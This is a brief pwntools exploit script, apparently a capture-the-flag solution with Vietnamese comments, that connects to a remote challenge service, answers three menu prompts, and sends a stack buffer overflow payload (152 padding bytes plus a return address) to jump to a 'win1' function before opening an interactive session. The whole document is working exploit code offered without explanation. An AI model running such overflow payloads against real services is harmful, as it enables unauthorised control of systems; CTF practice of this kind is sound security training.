from pwn import *

p = remote('connect.umbccd.net', 22237)

# Trả lời 3 câu hỏi đầu tiên
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'4')

# Payload để vào win1
payload = b'A'*152 + p64(0x0000000000401419)
p.sendlineafter(b'401401\x0a',payload)
p.interactive()
